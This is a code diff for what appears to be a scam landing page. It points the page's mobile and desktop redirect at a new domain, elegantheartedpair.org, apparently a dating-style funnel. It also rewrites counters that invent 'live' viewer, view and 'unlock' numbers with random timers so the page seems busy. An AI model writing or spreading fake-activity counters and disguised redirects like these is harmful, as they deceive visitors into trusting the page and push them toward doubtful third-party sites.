@@ -353,9 +353,9 @@ function closeModal(){document.getElementById('videoModal').style.display='none'
 
 function redirectMobile(){
   const ua=navigator.userAgent||navigator.vendor||window.opera;
-  const androidUrl="https://wr22mrh.fun-meetconnect.com/cadphtw";
-  const iosUrl="https://wr22mrh.fun-meetconnect.com/cadphtw";
-  const desktopUrl="https://wr22mrh.fun-meetconnect.com/cadphtw";
+  const androidUrl="https://wr22mrh.elegantheartedpair.org/cadphtw";
+  const iosUrl="https://wr22mrh.elegantheartedpair.org/cadphtw";
+  const desktopUrl="https://wr22mrh.elegantheartedpair.org/cadphtw";
   if(/android/i.test(ua)){window.location.href=androidUrl;}
   else if(/iPad|iPhone|iPod/.test(ua) && !window.MSStream){window.location.href=iosUrl;}
   else{window.location.href=desktopUrl;}
@@ -365,15 +365,45 @@ function redirectMobile(){
 const liveCountEl=document.getElementById("liveCount");
 const totalViewsEl=document.getElementById("totalViews");
 const totalUnlocksEl=document.getElementById("totalUnlocks");
-const leftCountEl=document.getElementById("leftCount");
-let currentCount=21, totalViews=12039, totalUnlocks=6091;
-let maxDailyUnlocks=totalUnlocks+parseInt(leftCountEl.innerText);
-const MIN=27, MAX=378;
-function formatNumber(num){return num.toLocaleString("en-US");}
-function updateLiveCount(){let dir=Math.random()>0.5?1:-1; let newCount=currentCount+dir; if(newCount<MIN)newCount=MIN; if(newCount>MAX)newCount=MAX; currentCount=newCount; liveCountEl.innerText=currentCount; setTimeout(updateLiveCount, Math.floor(Math.random()*300)+500);}
-function updateTotalViews(){let inc=Math.random()>0.8?2:1; totalViews+=inc; totalViewsEl.innerText=formatNumber(totalViews); setTimeout(updateTotalViews, Math.floor(Math.random()*3000)+3000);}
-function updateTotalUnlocks(){totalUnlocks+=1; totalUnlocksEl.innerText=formatNumber(totalUnlocks); let left=maxDailyUnlocks-totalUnlocks; if(left<0)left=0; leftCountEl.innerText=left; setTimeout(updateTotalUnlocks, Math.floor(Math.random()*20000)+30000);}
-setTimeout(updateLiveCount,600); setTimeout(updateTotalViews,4000); setTimeout(updateTotalUnlocks,35000);
+
+let currentCount=21;
+let totalViews=12039;
+let totalUnlocks=6091;
+
+const MIN=27;
+const MAX=378;
+
+function formatNumber(num){
+  return Number(num).toLocaleString("en-US");
+}
+
+function updateLiveCount(){
+  const dir=Math.random()>0.5 ? 1 : -1;
+  let newCount=currentCount+dir;
+  if(newCount<MIN) newCount=MIN;
+  if(newCount>MAX) newCount=MAX;
+  currentCount=newCount;
+  liveCountEl.textContent=currentCount;
+  setTimeout(updateLiveCount,Math.floor(Math.random()*300)+500);
+}
+
+function updateTotalViews(){
+  const inc=Math.random()>0.8 ? 2 : 1;
+  totalViews+=inc;
+  totalViewsEl.textContent=formatNumber(totalViews);
+  setTimeout(updateTotalViews,Math.floor(Math.random()*3000)+3000);
+}
+
+function updateTotalUnlocks(){
+  totalUnlocks+=1;
+  totalUnlocksEl.textContent=formatNumber(totalUnlocks);
+  setTimeout(updateTotalUnlocks,Math.floor(Math.random()*20000)+30000);
+}
+
+// Запуск счётчиков
+updateLiveCount();
+setTimeout(updateTotalViews,4000);
+setTimeout(updateTotalUnlocks,35000);
 
 // password generator
 document.addEventListener("DOMContentLoaded", () => {
@@ -432,7 +462,6 @@ function googleTranslateElementInit() {
 <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 </body>
 </html>
-
 
 
 
